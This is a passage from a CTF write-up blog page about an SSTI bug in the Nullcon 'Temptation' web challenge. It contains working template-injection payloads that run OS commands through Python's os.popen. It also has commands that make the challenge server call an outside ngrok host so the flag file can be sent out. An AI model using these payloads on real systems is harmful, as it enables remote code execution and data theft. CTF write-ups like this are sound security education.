@@ -1,0 +1,720 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>🌐 Temptation - mH4ck3r0n3&#39;s Blog</title><script src="https://cdn.jsdelivr.net/npm/fuse.js@6.4.6/dist/fuse.min.js"></script>
+<meta name="Description" content="A detailed write-up of the Web challenge &#39;Temptation&#39; from NullCon Goa HackIM CTF - 2025"><meta property="og:url" content="https://mh4ck3r0n3.github.io/posts/2025/02/07/temptation/">
+  <meta property="og:site_name" content="mH4ck3r0n3&#39;s Blog">
+  <meta property="og:title" content="🌐 Temptation">
+  <meta property="og:description" content="A detailed write-up of the Web challenge &#39;Temptation&#39; from NullCon Goa HackIM CTF - 2025">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-02-07T19:35:39+01:00">
+    <meta property="article:modified_time" content="2025-02-07T19:35:39+01:00">
+    <meta property="article:tag" content="💉 SSTI (Server Side Template Injection)">
+    <meta property="article:tag" content="🌐 Web Security">
+    <meta property="og:image" content="https://mh4ck3r0n3.github.io/logo.png">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="https://mh4ck3r0n3.github.io/logo.png">
+  <meta name="twitter:title" content="🌐 Temptation">
+  <meta name="twitter:description" content="A detailed write-up of the Web challenge &#39;Temptation&#39; from NullCon Goa HackIM CTF - 2025">
+<meta name="application-name" content="mH4ck3r0n3&#39;s Blog">
+<meta name="apple-mobile-web-app-title" content="mH4ck3r0n3&#39;s Blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://mh4ck3r0n3.github.io/posts/2025/02/07/temptation/" /><link rel="prev" href="https://mh4ck3r0n3.github.io/posts/2025/02/07/sess.io/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"></noscript><link rel="preload" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"></noscript><meta name="google-site-verification" content="Z-UoSLcRkeqd45L7xfo6KhHLAHRigsRvXpv1cYBypy4" /><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "🌐 Temptation",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/mh4ck3r0n3.github.io\/posts\/2025\/02\/07\/temptation\/"
+        },"genre": "posts","keywords": "💉 SSTI (Server Side Template Injection), 🌐 Web Security","wordcount":  1591 ,
+        "url": "https:\/\/mh4ck3r0n3.github.io\/posts\/2025\/02\/07\/temptation\/","datePublished": "2025-02-07T19:35:39+01:00","dateModified": "2025-02-07T19:35:39+01:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "mH4ck3r0n3"
+            },"description": "A detailed write-up of the Web challenge 'Temptation' from NullCon Goa HackIM CTF - 2025"
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="mH4ck3r0n3&#39;s Blog"><span class="header-title-pre"><i class='fa-solid fa-terminal' aria-hidden='true'></i></span><span id="id-2" class="typeit"></span></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/" title="Posts"> Posts </a><a class="menu-item" href="/categories/" title="Categories"> Categories </a><a class="menu-item" href="/tags/" title="Tags"> Tags </a><a class="menu-item" href="/about/" title="About Me"> About Me </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="mH4ck3r0n3&#39;s Blog"><span class="header-title-pre"><i class='fa-solid fa-terminal' aria-hidden='true'></i></span><span id="id-3" class="typeit"></span></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="Posts">Posts</a><a class="menu-item" href="/categories/" title="Categories">Categories</a><a class="menu-item" href="/tags/" title="Tags">Tags</a><a class="menu-item" href="/about/" title="About Me">About Me</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">🌐 Temptation</h1><h2 class="single-subtitle">A detailed write-up of the Web challenge &#39;Temptation&#39; from NullCon Goa HackIM CTF - 2025</h2><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://mh4ck3r0n3.github.io/" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>mH4ck3r0n3</a></span><span class="post-category"><a href="/categories/ethical-hacking/ctfs/jeopardy/nullcon-goa-hackim-ctf-2025/web/">
+                                    <i class="far fa-folder fa-fw" aria-hidden="true"></i> Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web
+                                </a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="07/02/2025">07/02/2025</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;1591 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;8 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#-challenge-overview">📊 Challenge Overview</a></li>
+        <li><a href="#-challenge-information">📝 Challenge Information</a></li>
+        <li><a href="#-challenge-files--infrastructure">🎯 Challenge Files &amp; Infrastructure</a>
+          <ul>
+            <li><a href="#provided-files">Provided Files</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#-initial-analysis">🔍 Initial Analysis</a>
+      <ul>
+        <li><a href="#first-steps">First Steps</a></li>
+        <li><a href="#-vulnerability-analysis">🔬 Vulnerability Analysis</a>
+          <ul>
+            <li><a href="#potential-vulnerabilities">Potential Vulnerabilities</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#-solution-path">🎯 Solution Path</a>
+      <ul>
+        <li><a href="#exploitation-steps">Exploitation Steps</a>
+          <ul>
+            <li><a href="#initial-setup">Initial setup</a></li>
+            <li><a href="#exploitation">Exploitation</a></li>
+            <li><a href="#flag-capture">Flag capture</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#-exploitation-process">🛠️ Exploitation Process</a>
+      <ul>
+        <li><a href="#approach">Approach</a></li>
+      </ul>
+    </li>
+    <li><a href="#-flag-capture">🚩 Flag Capture</a>
+      <ul>
+        <li><a href="#proof-of-execution">Proof of Execution</a></li>
+      </ul>
+    </li>
+    <li><a href="#-tools-used">🔧 Tools Used</a></li>
+    <li><a href="#-key-learnings">💡 Key Learnings</a>
+      <ul>
+        <li><a href="#new-knowledge">New Knowledge</a></li>
+        <li><a href="#skills-improved">Skills Improved</a></li>
+      </ul>
+    </li>
+    <li><a href="#-final-statistics">📊 Final Statistics</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p><figure><a class="lightgallery" href="/images/NullCon-Goa-HackIM-CTF-2025/Temptation/challenge_presentation.png" title="Challenge Presentation" data-thumbnail="/images/NullCon-Goa-HackIM-CTF-2025/Temptation/challenge_presentation.png" data-sub-html="<h2>Challenge Presentation</h2><p>Challenge Presentation</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/images/NullCon-Goa-HackIM-CTF-2025/Temptation/challenge_presentation.png"
+            data-srcset="/images/NullCon-Goa-HackIM-CTF-2025/Temptation/challenge_presentation.png, /images/NullCon-Goa-HackIM-CTF-2025/Temptation/challenge_presentation.png 1.5x, /images/NullCon-Goa-HackIM-CTF-2025/Temptation/challenge_presentation.png 2x"
+            data-sizes="auto"
+            alt="/images/NullCon-Goa-HackIM-CTF-2025/Temptation/challenge_presentation.png" />
+    </a><figcaption class="image-caption">Challenge Presentation</figcaption>
+    </figure></p>
+<h2 id="-challenge-overview">📊 Challenge Overview</h2>
+<blockquote>
+<table>
+<thead>
+<tr>
+<th>Category</th>
+<th>Details</th>
+<th>Additional Info</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>🏆 Event</td>
+<td>Nullcon Goa HackIM 2025 CTF</td>
+<td><a href="https://ctf.nullcon.net/challenges#Temptation-64" target="_blank" rel="noopener noreffer ">Event Link</a></td>
+</tr>
+<tr>
+<td>🔰 Category</td>
+<td>Web</td>
+<td>🌐</td>
+</tr>
+<tr>
+<td>💎 Points</td>
+<td>500</td>
+<td>Out of 500 total</td>
+</tr>
+<tr>
+<td>⭐ Difficulty</td>
+<td>🟡 Medium</td>
+<td>Personal Rating: 5/10</td>
+</tr>
+<tr>
+<td>👤 Author</td>
+<td>@gehaxelt</td>
+<td><a href="" rel="">Profile</a></td>
+</tr>
+<tr>
+<td>🎮 Solves (At the time of flag submission)</td>
+<td>83</td>
+<td>solve rate</td>
+</tr>
+<tr>
+<td>📅 Date</td>
+<td>01-02-2025</td>
+<td>Nullcon Goa HackIM 2025 CTF</td>
+</tr>
+<tr>
+<td>🦾 Solved By</td>
+<td>mH4ck3r0n3</td>
+<td>Team: QnQSec</td>
+</tr>
+</tbody>
+</table>
+</blockquote>
+<h2 id="-challenge-information">📝 Challenge Information</h2>
+<blockquote>
+<p>The attempted attempt to tempt the untempted into a tempting but contemptible scheme was an untempting temptation that exemplified not only contempt but also a preemptive exemption from any redemptive attempts.
+http://52.59.124.14:5011</p>
+</blockquote>
+<h2 id="-challenge-files--infrastructure">🎯 Challenge Files &amp; Infrastructure</h2>
+<h3 id="provided-files">Provided Files</h3>
+<blockquote>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-yaml" data-lang="yaml"><span class="line"><span class="cl"><span class="nt">Files</span><span class="p">:</span><span class="w"> </span><span class="l">None</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div></blockquote>
+<h1 id="-initial-analysis">🔍 Initial Analysis</h1>
+<h2 id="first-steps">First Steps</h2>
+<blockquote>
+<p>Initially, the website appears as follows:</p>
+<p><figure><a class="lightgallery" href="/images/NullCon-Goa-HackIM-CTF-2025/Temptation/site_presentation.png" title="Site Presentation" data-thumbnail="/images/NullCon-Goa-HackIM-CTF-2025/Temptation/site_presentation.png" data-sub-html="<h2>Site Presentation</h2><p>Site Presentation</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/images/NullCon-Goa-HackIM-CTF-2025/Temptation/site_presentation.png"
+            data-srcset="/images/NullCon-Goa-HackIM-CTF-2025/Temptation/site_presentation.png, /images/NullCon-Goa-HackIM-CTF-2025/Temptation/site_presentation.png 1.5x, /images/NullCon-Goa-HackIM-CTF-2025/Temptation/site_presentation.png 2x"
+            data-sizes="auto"
+            alt="/images/NullCon-Goa-HackIM-CTF-2025/Temptation/site_presentation.png" />
+    </a><figcaption class="image-caption">Site Presentation</figcaption>
+    </figure></p>
+<p>Inspecting the page source:</p>
+<p><figure><a class="lightgallery" href="/images/NullCon-Goa-HackIM-CTF-2025/Temptation/source.png" title="Source Page" data-thumbnail="/images/NullCon-Goa-HackIM-CTF-2025/Temptation/source.png" data-sub-html="<h2>Source Page</h2><p>Source Page</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/images/NullCon-Goa-HackIM-CTF-2025/Temptation/source.png"
+            data-srcset="/images/NullCon-Goa-HackIM-CTF-2025/Temptation/source.png, /images/NullCon-Goa-HackIM-CTF-2025/Temptation/source.png 1.5x, /images/NullCon-Goa-HackIM-CTF-2025/Temptation/source.png 2x"
+            data-sizes="auto"
+            alt="/images/NullCon-Goa-HackIM-CTF-2025/Temptation/source.png" />
+    </a><figcaption class="image-caption">Source Page</figcaption>
+    </figure></p>
+<p>I found the route <code>/?source</code>, which was supposed to show me the server-side source code:</p>
+<p><figure><a class="lightgallery" href="/images/NullCon-Goa-HackIM-CTF-2025/Temptation/source_path.png" title="Source Path" data-thumbnail="/images/NullCon-Goa-HackIM-CTF-2025/Temptation/source_path.png" data-sub-html="<h2>Source Path</h2><p>Source Path</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/images/NullCon-Goa-HackIM-CTF-2025/Temptation/source_path.png"
+            data-srcset="/images/NullCon-Goa-HackIM-CTF-2025/Temptation/source_path.png, /images/NullCon-Goa-HackIM-CTF-2025/Temptation/source_path.png 1.5x, /images/NullCon-Goa-HackIM-CTF-2025/Temptation/source_path.png 2x"
+            data-sizes="auto"
+            alt="/images/NullCon-Goa-HackIM-CTF-2025/Temptation/source_path.png" />
+    </a><figcaption class="image-caption">Source Path</figcaption>
+    </figure></p>
+<p>But when visiting it, I received the same page as before from <code>/</code>. So, I tried passing the parameter <code>/?source=0</code> and got the source code:</p>
+<p><figure><a class="lightgallery" href="/images/NullCon-Goa-HackIM-CTF-2025/Temptation/source_page.png" title="Source Code" data-thumbnail="/images/NullCon-Goa-HackIM-CTF-2025/Temptation/source_page.png" data-sub-html="<h2>Source Code</h2><p>Source Code</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/images/NullCon-Goa-HackIM-CTF-2025/Temptation/source_page.png"
+            data-srcset="/images/NullCon-Goa-HackIM-CTF-2025/Temptation/source_page.png, /images/NullCon-Goa-HackIM-CTF-2025/Temptation/source_page.png 1.5x, /images/NullCon-Goa-HackIM-CTF-2025/Temptation/source_page.png 2x"
+            data-sizes="auto"
+            alt="/images/NullCon-Goa-HackIM-CTF-2025/Temptation/source_page.png" />
+    </a><figcaption class="image-caption">Source Code</figcaption>
+    </figure></p>
+<p>Indeed, as we can see from the source code, any GET request with the parameter <code>/?source=something</code> returns the source code of the page. It&rsquo;s also possible to make a POST request to the page passing a <code>temptation</code> parameter. If the <code>temptation</code> parameter contains <code>flag</code> or <code>FLAG</code> (and so on), since everything is converted to lowercase, an error message is returned. It then checks if the parameter we send equals <code>FLAG</code>, and if so, it returns the actual flag. Initially, I thought of some kind of character escape or encoding to bypass the first check and reach the second one to pass it. As the first step, I copied the source and created a file <a href="/resources/NullCon-Goa-HackIM-CTF-2025/Temptation/app.py" rel=""><i class="far fa-file-archive fa-fw" aria-hidden="true"></i>&nbsp;app.py</a>. I added a couple of print statements for debugging purposes to understand how everything works. It had dependencies, so I installed <code>web.py</code> and then started the app locally:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">pip install web.py
+</span></span><span class="line"><span class="cl">python3 app.py
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="/images/NullCon-Goa-HackIM-CTF-2025/Temptation/app.png" title="App Execution" data-thumbnail="/images/NullCon-Goa-HackIM-CTF-2025/Temptation/app.png" data-sub-html="<h2>App Execution</h2><p>App Execution</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/images/NullCon-Goa-HackIM-CTF-2025/Temptation/app.png"
+            data-srcset="/images/NullCon-Goa-HackIM-CTF-2025/Temptation/app.png, /images/NullCon-Goa-HackIM-CTF-2025/Temptation/app.png 1.5x, /images/NullCon-Goa-HackIM-CTF-2025/Temptation/app.png 2x"
+            data-sizes="auto"
+            alt="/images/NullCon-Goa-HackIM-CTF-2025/Temptation/app.png" />
+    </a><figcaption class="image-caption">App Execution</figcaption>
+    </figure></p>
+<p>Next, I started making test requests using <code>curl</code> to test for a potential template injection with the parameter <code>temptation=\${injection}</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"> curl -X POST <span class="s2">&#34;http://0.0.0.0:8080/&#34;</span> --data-urlencode <span class="s2">&#34;temptation=\${chr(70)+chr(76)+chr(65)+chr(71)}&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>I tried to bypass the check by sending <code>flag</code> composed of the conversion from decimal to text (ASCII) using Python&rsquo;s <code>chr()</code> function, since through the template injection I was able to execute Python. As we can see, once I send the request, it halts at the last <code>if</code> statement, which checks <code>str(temptation) == &quot;FLAG&quot;</code>.</p>
+<p><figure><a class="lightgallery" href="/images/NullCon-Goa-HackIM-CTF-2025/Temptation/curl1.png" title="Curl 1" data-thumbnail="/images/NullCon-Goa-HackIM-CTF-2025/Temptation/curl1.png" data-sub-html="<h2>Curl 1</h2><p>Curl 1</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/images/NullCon-Goa-HackIM-CTF-2025/Temptation/curl1.png"
+            data-srcset="/images/NullCon-Goa-HackIM-CTF-2025/Temptation/curl1.png, /images/NullCon-Goa-HackIM-CTF-2025/Temptation/curl1.png 1.5x, /images/NullCon-Goa-HackIM-CTF-2025/Temptation/curl1.png 2x"
+            data-sizes="auto"
+            alt="/images/NullCon-Goa-HackIM-CTF-2025/Temptation/curl1.png" />
+    </a><figcaption class="image-caption">Curl 1</figcaption>
+    </figure></p>
+<p>With the debug prints I previously added to the code, I understood why it wasn&rsquo;t working. As we can see, it evaluates <code>&quot;Your temptation is: FLAG&quot; == &quot;FLAG&quot;</code>, and of course, this condition will never be true. So, I thought of using escape characters, also converted from decimal to ASCII using the <code>chr()</code> function. Invisible characters should not be recognized by the server. The first thing I tried to send was <code>temptation=\${chr(0)+chr(70)+chr(76)+chr(65)+chr(71)}</code>, where I added <code>chr(0)</code>, which represents the <code>\x00</code> (null character) string terminator, so it would stop before <code>FLAG</code> and only insert <code>FLAG</code> into the <code>temptation</code> variable. However, this didn&rsquo;t work. The second thing I tried was sending backspace characters, i.e., the character used to erase on a keyboard. By sending <code>chr(8)</code> (the backspace character in ASCII) before the characters forming the word <code>FLAG</code>, it would erase the unwanted part (<code>Your temptation is: </code>), bypassing the check and allowing the correct flag to pass.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl -X POST <span class="s2">&#34;http://0.0.0.0:8080/&#34;</span> --data-urlencode <span class="s2">&#34;temptation=\${chr(8)+chr(8)+chr(8)+chr(8)+chr(8)+chr(8)+chr(8)+chr(8)+chr(8)+chr(8)+chr(8)+chr(8)+chr(8)+chr(8)+chr(8)+chr(8)+chr(8)+chr(8)+chr(8)+chr(8)+chr(70)+chr(76)+chr(65)+chr(71)}&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="/images/NullCon-Goa-HackIM-CTF-2025/Temptation/curl2.png" title="Curl 2" data-thumbnail="/images/NullCon-Goa-HackIM-CTF-2025/Temptation/curl2.png" data-sub-html="<h2>Curl 2</h2><p>Curl 2</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/images/NullCon-Goa-HackIM-CTF-2025/Temptation/curl2.png"
+            data-srcset="/images/NullCon-Goa-HackIM-CTF-2025/Temptation/curl2.png, /images/NullCon-Goa-HackIM-CTF-2025/Temptation/curl2.png 1.5x, /images/NullCon-Goa-HackIM-CTF-2025/Temptation/curl2.png 2x"
+            data-sizes="auto"
+            alt="/images/NullCon-Goa-HackIM-CTF-2025/Temptation/curl2.png" />
+    </a><figcaption class="image-caption">Curl 2</figcaption>
+    </figure></p>
+<p>As we can see, however, the backspace character did not actually erase the text; instead, it literally replaced the text (much like in Vim&rsquo;s REPLACE mode). So, after trying a sequence of characters that would erase the line, and experimenting with other approaches, I realized that it wasn&rsquo;t the right path. I then tried to execute a command locally, such as <code>id</code>, using Python&rsquo;s <code>os</code> module:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl -X POST <span class="s2">&#34;http://0.0.0.0:8080/&#34;</span> --data-urlencode <span class="s2">&#34;temptation=\${__import__(&#39;os&#39;).popen(&#39;id&#39;).read()}&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="/images/NullCon-Goa-HackIM-CTF-2025/Temptation/curl3.png" title="Curl 3" data-thumbnail="/images/NullCon-Goa-HackIM-CTF-2025/Temptation/curl3.png" data-sub-html="<h2>Curl 3</h2><p>Curl 3</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/images/NullCon-Goa-HackIM-CTF-2025/Temptation/curl3.png"
+            data-srcset="/images/NullCon-Goa-HackIM-CTF-2025/Temptation/curl3.png, /images/NullCon-Goa-HackIM-CTF-2025/Temptation/curl3.png 1.5x, /images/NullCon-Goa-HackIM-CTF-2025/Temptation/curl3.png 2x"
+            data-sizes="auto"
+            alt="/images/NullCon-Goa-HackIM-CTF-2025/Temptation/curl3.png" />
+    </a><figcaption class="image-caption">Curl 3</figcaption>
+    </figure></p>
+<p>As we can see, the command actually gets executed, but in the end, it hits the last <code>if</code> statement and doesn&rsquo;t return the flag because it fails the check. From there, I attempted to get a reverse shell via netcat, but obviously, it would have to be installed on the server, and I wasn&rsquo;t sure about that. I then thought of using the classic reverse shell with <code>/dev/tcp</code> in Bash to establish a TCP connection, but that didn’t work either. So, I found my own way around it. Let&rsquo;s move on to the exploitation.</p>
+</blockquote>
+<h2 id="-vulnerability-analysis">🔬 Vulnerability Analysis</h2>
+<h3 id="potential-vulnerabilities">Potential Vulnerabilities</h3>
+<blockquote>
+<ul>
+<li><i class="far fa-check-square fa-fw" aria-hidden="true"></i> SSTI (Server Side Template Injection)</li>
+</ul>
+</blockquote>
+<h1 id="-solution-path">🎯 Solution Path</h1>
+<h2 id="exploitation-steps">Exploitation Steps</h2>
+<h3 id="initial-setup">Initial setup</h3>
+<blockquote>
+<p>My idea was to redirect the contents of <code>/tmp/flag.txt</code> to my own web server by sending the flag in a request parameter. So the first thing I did was start a web server:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ngrok http <span class="m">8080</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Once I started the web server, I first tried with a local request by directing <code>curl</code> to my own server, exploiting the SSTI vulnerability.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl -X POST <span class="s2">&#34;http://0.0.0.0:8080/&#34;</span> --data-urlencode <span class="s2">&#34;temptation=\${__import__(&#39;os&#39;).popen(&#39;curl https://c590-2-37-206-147.ngrok-free.app&#39;).read()}&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="/images/NullCon-Goa-HackIM-CTF-2025/Temptation/curl4.png" title="Curl 4" data-thumbnail="/images/NullCon-Goa-HackIM-CTF-2025/Temptation/curl4.png" data-sub-html="<h2>Curl 4</h2><p>Curl 4</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/images/NullCon-Goa-HackIM-CTF-2025/Temptation/curl4.png"
+            data-srcset="/images/NullCon-Goa-HackIM-CTF-2025/Temptation/curl4.png, /images/NullCon-Goa-HackIM-CTF-2025/Temptation/curl4.png 1.5x, /images/NullCon-Goa-HackIM-CTF-2025/Temptation/curl4.png 2x"
+            data-sizes="auto"
+            alt="/images/NullCon-Goa-HackIM-CTF-2025/Temptation/curl4.png" />
+    </a><figcaption class="image-caption">Curl 4</figcaption>
+    </figure></p>
+<p>As we can see, the request arrives on ngrok. Now, it needs to be tested if the same happens when performing this process on the challenge server, not locally (since <code>curl</code> needs to be installed on the web server to make requests).</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl -X POST <span class="s2">&#34;http://52.59.124.14:5011/&#34;</span> --data-urlencode <span class="s2">&#34;temptation=\${__import__(&#39;os&#39;).popen(&#39;curl https://c590-2-37-206-147.ngrok-free.app&#39;).read()}&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="/images/NullCon-Goa-HackIM-CTF-2025/Temptation/curl5.png" title="Curl 5" data-thumbnail="/images/NullCon-Goa-HackIM-CTF-2025/Temptation/curl5.png" data-sub-html="<h2>Curl 5</h2><p>Curl 5</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/images/NullCon-Goa-HackIM-CTF-2025/Temptation/curl5.png"
+            data-srcset="/images/NullCon-Goa-HackIM-CTF-2025/Temptation/curl5.png, /images/NullCon-Goa-HackIM-CTF-2025/Temptation/curl5.png 1.5x, /images/NullCon-Goa-HackIM-CTF-2025/Temptation/curl5.png 2x"
+            data-sizes="auto"
+            alt="/images/NullCon-Goa-HackIM-CTF-2025/Temptation/curl5.png" />
+    </a><figcaption class="image-caption">Curl 5</figcaption>
+    </figure></p>
+<p>As we can see, it works, and <code>curl</code> is correctly installed on the web server. This allows us to redirect the request to our server. After a few tests locally, I was able to get the response of the <code>id</code> command execution from the remote challenge web server to my web server created with ngrok.</p>
